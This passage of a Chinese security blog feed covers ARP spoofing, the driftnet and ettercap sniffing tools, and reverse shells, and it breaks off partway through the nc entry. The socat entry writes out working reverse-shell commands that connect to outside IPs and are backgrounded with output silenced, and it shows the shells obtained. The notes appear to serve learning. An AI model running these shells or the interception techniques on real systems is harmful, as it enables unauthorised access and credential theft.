欺骗，靶机的数据都会传递到攻击机</p><p>现象：</p><p>靶机无法访问网络，攻击机开启端口转发功能后靶机可以正常访问网络</p><p>解决方案：</p><p>开启端口转发命令（默认值为 0 ，也就是不开启端口转发），该端口转发为临时设置，重启会失效，恢复为 0 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1、适用攻击机和靶机在同一网络下</p><p>2、攻击命令需要持续运行，停止运行之后，靶机网关 mac 地址会自动刷新</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_43520214/article/details/123626278">https://blog.csdn.net/weixin_43520214/article/details/123626278</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_driftnet</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_driftnet/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_driftnet/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>driftnet 是用于捕获图片的工具，既可以离线获取，也就是 pcap 数据包中获取，也可以在线获取</p><p>kali 中默认存在该工具</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>driftnet [options] [filter code]</p><h2 id="options"><a href="#options" class="headerlink" title="options"></a>options</h2><h3 id="h"><a href="#h" class="headerlink" title="-h"></a>-h</h3><h3 id="v-展示详情"><a href="#v-展示详情" class="headerlink" title="-v 展示详情"></a>-v 展示详情</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="b-捕获到新的图片时发出嘟嘟声音"><a href="#b-捕获到新的图片时发出嘟嘟声音" class="headerlink" title="-b 捕获到新的图片时发出嘟嘟声音"></a>-b 捕获到新的图片时发出嘟嘟声音</h3><h3 id="i-interface-设置数据包监听接口，默认会以混杂模式监听所有接口"><a href="#i-interface-设置数据包监听接口，默认会以混杂模式监听所有接口" class="headerlink" title="-i interface 设置数据包监听接口，默认会以混杂模式监听所有接口"></a>-i interface 设置数据包监听接口，默认会以混杂模式监听所有接口</h3><h3 id="f-file-代替监听接口，从-pcap-文件中读取"><a href="#f-file-代替监听接口，从-pcap-文件中读取" class="headerlink" title="-f file 代替监听接口，从 pcap 文件中读取"></a>-f file 代替监听接口，从 pcap 文件中读取</h3><h3 id="p-设置监听端口不使用混杂模式"><a href="#p-设置监听端口不使用混杂模式" class="headerlink" title="-p 设置监听端口不使用混杂模式"></a>-p 设置监听端口不使用混杂模式</h3><h3 id="a-附加模式，捕获的图片将保存在目录中，不会在前台展示"><a href="#a-附加模式，捕获的图片将保存在目录中，不会在前台展示" class="headerlink" title="-a 附加模式，捕获的图片将保存在目录中，不会在前台展示"></a>-a 附加模式，捕获的图片将保存在目录中，不会在前台展示</h3><h3 id="m-number-附加模式下，也就是-a-下，捕获图片的数量，超过数量之后会删除"><a href="#m-number-附加模式下，也就是-a-下，捕获图片的数量，超过数量之后会删除" class="headerlink" title="-m number  附加模式下，也就是 -a 下，捕获图片的数量，超过数量之后会删除"></a>-m number  附加模式下，也就是 -a 下，捕获图片的数量，超过数量之后会删除</h3><h3 id="x-prefix-设置保存的图片前缀，默认是-driftnet"><a href="#x-prefix-设置保存的图片前缀，默认是-driftnet" class="headerlink" title="-x prefix  设置保存的图片前缀，默认是 driftnet-*"></a>-x prefix  设置保存的图片前缀，默认是 driftnet-*</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root💀kali2021)-[/home/kali/img]<br>└─# ls<br>driftnet<span class="hljs-string">-639933</span>ef6b8b4567.jpeg  driftnet<span class="hljs-string">-63997</span>b5500c4c3af.png  driftnet<span class="hljs-string">-63997</span>b552c7c62c2.png  driftnet<span class="hljs-string">-63997</span>b55569951fe.png  driftnet<span class="hljs-string">-63997</span>b5a4239dc03.png<br>driftnet<span class="hljs-string">-639933</span>fa327b23c6.jpeg  driftnet<span class="hljs-string">-63997</span>b5500e3dfe6.png  driftnet<span class="hljs-string">-63997</span>b552cb6a6a4.png  driftnet<span class="hljs-string">-63997</span>b5556c28e34.png  driftnet<span class="hljs-string">-63997</span>b5a45dc439d.png<br>driftnet<span class="hljs-string">-63993414643</span>c9869.jpeg  driftnet<span class="hljs-string">-63997</span>b5500e4b973.png  driftnet<span class="hljs-string">-63997</span>b552cdd5b39.png  driftnet<span class="hljs-string">-63997</span>b5557071613.png  driftnet<span class="hljs-string">-63997</span>b5a461bc834.png<br><br></code></pre></td></tr></table></figure><h3 id="d-directory-设置图片保存目录，driftnet-退出时会清空临时目录和文件，但不会清空该目录"><a href="#d-directory-设置图片保存目录，driftnet-退出时会清空临时目录和文件，但不会清空该目录" class="headerlink" title="-d directory 设置图片保存目录，driftnet 退出时会清空临时目录和文件，但不会清空该目录"></a>-d directory 设置图片保存目录，driftnet 退出时会清空临时目录和文件，但不会清空该目录</h3><h3 id="s-从网络中抓取视频文件并播放，如果使用附加模式-a-将会以MPEG格式保存在文件夹中"><a href="#s-从网络中抓取视频文件并播放，如果使用附加模式-a-将会以MPEG格式保存在文件夹中" class="headerlink" title="-s 从网络中抓取视频文件并播放，如果使用附加模式 -a ,将会以MPEG格式保存在文件夹中"></a>-s 从网络中抓取视频文件并播放，如果使用附加模式 -a ,将会以MPEG格式保存在文件夹中</h3><h3 id="S-从网络中抓取视频文件，忽略图片文件"><a href="#S-从网络中抓取视频文件，忽略图片文件" class="headerlink" title="-S 从网络中抓取视频文件，忽略图片文件"></a>-S 从网络中抓取视频文件，忽略图片文件</h3><h3 id="M-command-设置抓取到的视频播放"><a href="#M-command-设置抓取到的视频播放" class="headerlink" title="-M command 设置抓取到的视频播放"></a>-M command 设置抓取到的视频播放</h3><h3 id="Z-username-启动-pcap-后删除-username-的权限"><a href="#Z-username-启动-pcap-后删除-username-的权限" class="headerlink" title="-Z username 启动 pcap 后删除 username 的权限"></a>-Z username 启动 pcap 后删除 username 的权限</h3><h3 id="l-列出系统的捕获接口"><a href="#l-列出系统的捕获接口" class="headerlink" title="-l 列出系统的捕获接口"></a>-l 列出系统的捕获接口</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ldif">└─<span class="hljs-comment"># driftnet -l</span><br><span class="hljs-literal">-</span> 1.: eth0<br><br><span class="hljs-literal">-</span> 2.: any<br>Pseudo-device that captures on all interfaces<br><span class="hljs-literal">-</span> 3.: lo<br><br><span class="hljs-literal">-</span> 4.: bluetooth-monitor<br>Bluetooth Linux Monitor<br><span class="hljs-literal">-</span> 5.: nflog<br>Linux netfilter log (NFLOG) interface<br><span class="hljs-literal">-</span> 6.: nfqueue<br>Linux netfilter queue (NFQUEUE) interface<br><span class="hljs-literal">-</span> 7.: dbus-system<br>D-Bus system bus<br><span class="hljs-literal">-</span> 8.: dbus-session<br>D-Bus session bus<br></code></pre></td></tr></table></figure><h3 id="r-设置接口为监听模式，不适用于设置所有接口"><a href="#r-设置接口为监听模式，不适用于设置所有接口" class="headerlink" title="-r 设置接口为监听模式，不适用于设置所有接口"></a>-r 设置接口为监听模式，不适用于设置所有接口</h3><h3 id="g-开启-GTK-显示，默认模式"><a href="#g-开启-GTK-显示，默认模式" class="headerlink" title="-g 开启 GTK 显示，默认模式"></a>-g 开启 GTK 显示，默认模式</h3><h3 id="w-开启-HTTP-服务显示图片"><a href="#w-开启-HTTP-服务显示图片" class="headerlink" title="-w 开启 HTTP 服务显示图片"></a>-w 开启 HTTP 服务显示图片</h3><h3 id="W-设置-HTTP-服务端口，默认-9090"><a href="#W-设置-HTTP-服务端口，默认-9090" class="headerlink" title="-W 设置 HTTP 服务端口，默认 9090"></a>-W 设置 HTTP 服务端口，默认 9090</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_ettercap</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_ettercap/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_ettercap/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Ettercap 是一款免费的基于 ARP 地址欺骗方式的网络嗅探工具，kali 默认自带该软件</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>ettercap [OPTIONS] [TARGET1] [TARGET2]</p><p>如果 IPv6开启，TARGET 为 MAC&#x2F;IPs&#x2F;IPv6&#x2F;PORTS，否则为 MAC&#x2F;IPs&#x2F;PORTS</p><p>如果IP和端口是区间范围的，可以 &#x2F;192.168.0.1-30,40,50&#x2F;20,22,25</p><h2 id="两种嗅探模式"><a href="#两种嗅探模式" class="headerlink" title="两种嗅探模式"></a>两种嗅探模式</h2><h3 id="UNIFIED"><a href="#UNIFIED" class="headerlink" title="UNIFIED"></a>UNIFIED</h3><p>嗅探所有数据包，也就是中间人攻击</p><h3 id="BRTDGED"><a href="#BRTDGED" class="headerlink" title="BRTDGED"></a>BRTDGED</h3><p>嗅探双网卡之间数据包</p><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h3 id="没有源和目的的概念"><a href="#没有源和目的的概念" class="headerlink" title="没有源和目的的概念"></a>没有源和目的的概念</h3><h3 id="两个target是为了获取一个到一个之间的双向流量"><a href="#两个target是为了获取一个到一个之间的双向流量" class="headerlink" title="两个target是为了获取一个到一个之间的双向流量"></a>两个target是为了获取一个到一个之间的双向流量</h3><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>如果 IPv6开启，TARGET 为 MAC&#x2F;IPs&#x2F;IPv6&#x2F;PORTS，否则为 MAC&#x2F;IPs&#x2F;PORTS</p><p>如果IP和端口是区间范围的，可以 &#x2F;192.168.0.1-30,40,50&#x2F;20,22,25</p><p>示例：</p><p>&#x2F;&#x2F;80 表示所有 mac 地址和所有 IP 地址的 80 端口</p><p>&#x2F;10.10.10.10&#x2F; 表示所有 mac 地址、10.10.10.10和所有端口</p><p>MAC 地址必须唯一，且为十六进制 00:11:22:33:44:55</p><p>IP地址 十进制点记法，区间地址使用 - 分割，多个 IP 地址使用 ; 分割。10.0.0.1-5;10.0.1.33 表示 10.0.0.1,2,3,4,5 和 10.0.1.33</p><p>端口，区间地址使用 - 分割，多个端口使用 ; 分割。20-25,80,110 表示 20，21，22，23，24，25，80，110</p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><h2 id="支持-SSH1"><a href="#支持-SSH1" class="headerlink" title="支持 SSH1"></a>支持 SSH1</h2><p>可以嗅探 用户名和密码，可以获取 SSH1 连接的数据</p><h2 id="支持-SSL"><a href="#支持-SSL" class="headerlink" title="支持 SSL"></a>支持 SSL</h2><p>可以嗅探 SSL 数据，假的证书显示给客户端</p><h2 id="支持在建立的连接中注入字符"><a href="#支持在建立的连接中注入字符" class="headerlink" title="支持在建立的连接中注入字符"></a>支持在建立的连接中注入字符</h2><p>向服务器模拟命令，向客户端模拟响应</p><h2 id="数据报过滤或丢弃"><a href="#数据报过滤或丢弃" class="headerlink" title="数据报过滤或丢弃"></a>数据报过滤或丢弃</h2><p>可以通过过滤脚本在 UDP、TCP 载荷中查询、替换或删除指定字符（甚至十六进制）</p><h2 id="远程嗅探隧道或route-mangling"><a href="#远程嗅探隧道或route-mangling" class="headerlink" title="远程嗅探隧道或route mangling"></a>远程嗅探隧道或route mangling</h2><p>可以通过Linux伪造接口或者集成插件嗅探隧道或路由破坏的远程连接，并进行中间人攻击</p><h2 id="支持插件"><a href="#支持插件" class="headerlink" title="支持插件"></a>支持插件</h2><p>可以自己编写插件，利用 ettercap 插件</p><h2 id="口令收集"><a href="#口令收集" class="headerlink" title="口令收集"></a>口令收集</h2><p>支持 TELNET, FTP, POP, RLOGIN, SSH1, ICQ, SMB, MySQL, HTTP, NNTP, X11, NAPSTER, IRC, RIP, BGP, SOCKS 5,  IMAP  4,  VNC,  LDAP, NFS, SNMP, HALF LIFE, QUAKE 3, MSN, YMSG 等协议，未来会支持更多</p><h2 id="被动系统信息收集"><a href="#被动系统信息收集" class="headerlink" title="被动系统信息收集"></a>被动系统信息收集</h2><p>可以不发送任何数据包收集系统信息，包含操作系统，运行的服务，开放端口，IP, mac地址和网络适配器供应商等</p><h2 id="杀死连接"><a href="#杀死连接" class="headerlink" title="杀死连接"></a>杀死连接</h2><p>支持 kill 当前连接表的连接，甚至所有连接</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_socat_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_socat_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_socat_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><h4 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h4><p>攻击机</p><p><strong>socat TCP-LISTEN:攻击port -</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta"># socat TCP-LISTEN:1234 -</span><br></code></pre></td></tr></table></figure><p>靶机</p><p><strong>socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击IP:攻击port</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root💀kali2021)-<span class="hljs-selector-attr">[~]</span><br>└─# socat exec:<span class="hljs-string">&#x27;bash -i&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">10.13</span>.<span class="hljs-number">8.56</span>:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>攻击机获取到靶机权限</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@<span class="hljs-number">10</span> tmp]<span class="hljs-comment"># socat TCP-LISTEN:1234 -</span><br>┌──(rootkali2021)-[~]<br>└─<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>用户<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>(root) 组<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>(root) 组=<span class="hljs-number">0</span>(root),<span class="hljs-number">4</span>(adm),<span class="hljs-number">20</span>(dialout),<span class="hljs-number">121</span>(wireshark),<span class="hljs-number">146</span>(kaboxer)<br></code></pre></td></tr></table></figure><p>靶机监听</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root💀kali2021)-[~]<br>└─# netstat -anlp | grep <span class="hljs-number">1234</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0 10.210.128</span>.<span class="hljs-number">37:53676</span>     <span class="hljs-number">10.13.8.56</span>:<span class="hljs-number">1234</span>         ESTABLISHED <span class="hljs-number">3735496</span>/socat<br></code></pre></td></tr></table></figure><h4 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h4><p>攻击机</p><p><strong>socat udp-listen:攻击端口 -</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@110 test]# socat udp-listen:1234 -<br>bash: cannot <span class="hljs-built_in">set</span> terminal process<span class="hljs-built_in"> group </span>(1445706): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>ubuntu@VM-8-5-ubuntu:/root$ id<br>id<br><span class="hljs-attribute">uid</span>=1000(ubuntu) <span class="hljs-attribute">gid</span>=1000(ubuntu) <span class="hljs-attribute">groups</span>=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(base) [root<span class="hljs-variable">@110</span> ~]<span class="hljs-comment"># ps -ef | grep 1234</span><br>root      <span class="hljs-number">2383</span> <span class="hljs-number">16144</span>  <span class="hljs-number">0</span> <span class="hljs-number">20</span>:<span class="hljs-number">16</span> pts/<span class="hljs-number">4</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> socat udp-<span class="hljs-keyword">listen</span>:<span class="hljs-number">1234</span> -<br></code></pre></td></tr></table></figure><p>靶机</p><p><strong>socat udp-connect:攻击IP:端口 exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;&#x2F;dev&#x2F;null &amp;</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">socat udp-<span class="hljs-keyword">connect</span>:<span class="hljs-number">121.43</span><span class="hljs-number">.138</span><span class="hljs-number">.192</span>:<span class="hljs-number">1234</span> <span class="hljs-keyword">exec</span>:<span class="hljs-string">&#x27;bash -i&#x27;</span>,pty,stderr,sane <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>&gt;<span class="hljs-regexp">/dev/null</span> &amp;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/root$ sudo netstat -anlp | grep <span class="hljs-number">1234</span><br><span class="hljs-attribute">udp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.0.8.5:35413</span>          <span class="hljs-number">121.43.138.192:1234</span>     ESTABLISHED <span class="hljs-number">1445706</span>/socat<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_nc_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_nc_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_nc_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>nc 反弹是基于 nc(netcat&#x2F;ncat)命令来进行的反弹</p><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>目标系统中存在 nc 命令（默认系统中不会带有  nc 命令）</p><h2 id="nc-netcat-ncat-区别"><a href="#nc-netcat-ncat-区别" class="headerlink" title="nc netcat ncat 区别"></a>nc netcat ncat 区别</h2><p><strong>如果没有安装 ncat 或后安装 ncat ,nc命令就是 netcat 的软链</strong></p><p>没有安装 ncat 的情况</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># nc<br>usage: nc <span class="hljs-comment">[-46cDdFhklNnrStUuvz]</span> <span class="hljs-comment">[-C certfile]</span> <span class="hljs-comment">[-e name]</span> <span class="hljs-comment">[-H hash]</span> <span class="hljs-comment">[-I length]</span><br>  <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-K keyfile]</span> <span class="hljs-comment">[-M ttl]</span> <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span><br>  <span class="hljs-comment">[-o staplefile]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[-R CAfile]</span><br>  <span class="hljs-comment">[-s sourceaddr]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>  <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[-Z peercertfile]</span><br>  <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># netcat<br>usage: nc <span class="hljs-comment">[-46cDdFhklNnrStUuvz]</span> <span class="hljs-comment">[-C certfile]</span> <span class="hljs-comment">[-e name]</span> <span class="hljs-comment">[-H hash]</span> <span class="hljs-comment">[-I length]</span><br>  <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-K keyfile]</span> <span class="hljs-comment">[-M ttl]</span> <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span><br>  <span class="hljs-comment">[-o staplefile]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[-R CAfile]</span><br>  <span class="hljs-comment">[-s sourceaddr]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>  <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[-Z peercertfile]</span><br>  <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ncat<br>-bash: /usr/bin/ncat: 没有那个文件或目录<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># whereis nc<br>nc: /usr/bin/nc /usr/share/<span class="hljs-keyword">man</span>/man1/nc.1.gz<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ls -lath /usr/bin/nc<br>lrwxrwxrwx 1 root root 22 2月   1 14:41 /usr/bin/nc -&gt; /etc/alternatives/nmap<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ls -lath /etc/alternatives/nmap<br>lrwxrwxrwx 1 root root 15 2月   1 14:41 /etc/alternatives/nmap -&gt; /usr/bin/netcat<br></code></pre></td></tr></table></figure><p>后安装 ncat 的情况</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis nc<br>nc: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>nc.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis netcat<br>netcat: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/netcat /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>netcat.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis ncat<br>ncat: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ncat /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>ncat.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>nc<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">22</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc -&gt; /</span>etc<span class="hljs-regexp">/alternatives/</span>nmap<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-operator">/</span>nmap<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">15</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span> <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-regexp">/nmap -&gt; /</span>usr<span class="hljs-regexp">/bin/</span>netcat<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>netcat<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root <span class="hljs-number">45328</span> <span class="hljs-number">12</span>月 <span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">30</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>netcat<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>ncat<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root 372K <span class="hljs-number">8</span>月   <span class="hljs-number">9</span> <span class="hljs-number">2019</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>ncat<br></code></pre></td></tr></table></figure><p><strong>如果先安装 ncat 或只安装 ncat ，nc 就是 ncat 的软链</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis nc<br>nc: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>nc.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>nc<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">22</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">50</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc -&gt; /</span>etc<span class="hljs-regexp">/alternatives/</span>nmap<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/etc/</span>alternatives<span 